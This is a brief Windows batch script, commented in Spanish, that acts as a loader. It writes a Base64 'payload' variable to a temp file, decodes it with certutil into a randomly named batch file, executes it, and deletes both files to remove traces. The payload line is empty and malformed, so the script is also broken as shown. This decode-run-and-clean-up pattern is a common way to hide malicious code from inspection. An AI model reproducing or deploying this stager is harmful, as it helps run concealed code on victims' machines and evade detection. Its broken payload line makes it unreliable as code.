@echo off
setlocal

:: ---- Payload en Base64 ----
set ""

:: ---- Decodificar y ejecutar ----
set "TMPFILE=%TEMP%\payload_%RANDOM%.bat"

echo %B64% > "%TEMP%\b64tmp.txt"
certutil -decode "%TEMP%\b64tmp.txt" "%TMPFILE%" >nul 2>&1

call "%TMPFILE%"

:: ---- Limpieza ----
del "%TEMP%\b64tmp.txt" >nul 2>&1
del "%TMPFILE%" >nul 2>&1

endlocal
